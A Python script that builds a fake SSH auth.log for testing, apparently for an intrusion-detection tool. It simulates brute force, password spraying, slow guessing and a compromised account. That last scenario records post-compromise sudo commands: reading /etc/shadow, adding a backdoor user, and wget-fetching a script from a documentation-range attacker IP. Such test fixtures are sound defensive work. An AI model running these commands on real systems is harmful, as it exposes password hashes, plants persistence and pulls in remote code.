#!/usr/bin/env python3
"""Generate a fake auth.log for testing.

Everything here is made up. The attacker IPs come from the ranges set aside
for documentation (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24), so they
never point at a real host.

The file mixes normal activity with four attack scenarios:
  1. A loud brute force against root
  2. A password spray across many usernames
  3. A slow attacker who stays under the brute force threshold
  4. An attacker who guesses the 'deploy' password, then uses sudo
"""

import random
from datetime import datetime, timedelta

random.seed(42)
HOST = "web01"
START = datetime(2026, 11, 18, 0, 0, 0)
lines = []


def log(ts, process, message, pid=None):
    pid = pid or random.randint(1000, 9999)
    lines.append((ts, f"{ts.strftime('%b %d %H:%M:%S')} {HOST} {process}[{pid}]: {message}"))


def failed(ts, user, ip, invalid=False):
    pid = random.randint(1000, 9999)
    port = random.randint(30000, 65000)
    if invalid:
        log(ts, "sshd", f"Invalid user {user} from {ip} port {port}", pid)
        log(ts, "sshd", f"Failed password for invalid user {user} from {ip} port {port} ssh2", pid)
    else:
        log(ts, "sshd", f"Failed password for {user} from {ip} port {port} ssh2", pid)


def accepted(ts, user, ip, method="publickey"):
    pid = random.randint(1000, 9999)
    log(ts, "sshd", f"Accepted {method} for {user} from {ip} port {random.randint(30000, 65000)} ssh2", pid)
    log(ts, "sshd", f"pam_unix(sshd:session): session opened for user {user} by (uid=0)", pid)


def sudo(ts, user, command, target="root"):
    lines.append((ts, f"{ts.strftime('%b %d %H:%M:%S')} {HOST} sudo: {user} : TTY=pts/0 ; "
                      f"PWD=/home/{user} ; USER={target} ; COMMAND={command}"))


# Normal activity across the day: admins logging in with keys, routine sudo, cron.
for hour in range(0, 24):
    ts = START + timedelta(hours=hour, minutes=random.randint(0, 59))
    log(ts, "CRON", "pam_unix(cron:session): session opened for user root by (uid=0)")
    if 8 <= hour <= 18 and random.random() < 0.6:
        who = random.choice(["clint", "deploy"])
        accepted(ts + timedelta(minutes=1), who, f"10.0.0.{random.randint(10, 40)}")
        sudo(ts + timedelta(minutes=3), who, random.choice([
            "/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/tail -n 50 /var/log/syslog"]))

# 1. Loud brute force against root: 60 tries in about 8 minutes.
t = START + timedelta(hours=3, minutes=12)
for _ in range(60):
    failed(t, "root", "203.0.113.45")
    t += timedelta(seconds=random.randint(4, 12))

# 2. Password spray: one IP, many common usernames, a couple of tries each.
t = START + timedelta(hours=9, minutes=40)
for user in ["admin", "test", "oracle", "ubuntu", "pi", "postgres", "git", "ftp", "guest", "support"]:
    for _ in range(2):
        failed(t, user, "198.51.100.23", invalid=True)
        t += timedelta(seconds=random.randint(20, 70))

# 3. Low and slow: 4 failures spread across the afternoon. Should NOT trip brute force.
t = START + timedelta(hours=13)
for _ in range(4):
    failed(t, "clint", "192.0.2.77")
    t += timedelta(minutes=random.randint(40, 70))

# 4. Guessed password, then suspicious sudo use.
t = START + timedelta(hours=21, minutes=5)
for _ in range(6):
    failed(t, "deploy", "198.51.100.88")
    t += timedelta(seconds=random.randint(15, 40))
accepted(t, "deploy", "198.51.100.88", method="password")
sudo(t + timedelta(minutes=2), "deploy", "/usr/bin/cat /etc/shadow")
sudo(t + timedelta(minutes=4), "deploy", "/usr/sbin/useradd -m -s /bin/bash sysbackup")
sudo(t + timedelta(minutes=6), "deploy", "/usr/bin/wget http://203.0.113.200/update.sh -O /tmp/u.sh")

lines.sort(key=lambda pair: pair[0])
with open("sample_logs/auth.log", "w", encoding="utf-8") as out:
    out.write("\n".join(text for _, text in lines) + "\n")
print(f"Wrote {len(lines)} lines to sample_logs/auth.log")
